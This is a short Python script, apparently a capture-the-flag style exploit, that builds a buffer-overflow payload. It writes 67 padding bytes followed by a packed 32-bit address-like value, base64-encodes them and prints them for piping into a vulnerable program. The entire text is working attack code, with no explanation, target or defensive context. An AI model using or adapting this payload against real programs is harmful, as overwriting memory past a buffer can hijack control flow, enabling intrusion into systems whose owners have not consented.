
import sys
import struct
import base64

buf = b'qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq'
buf += struct.pack('<I', 1925945704)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
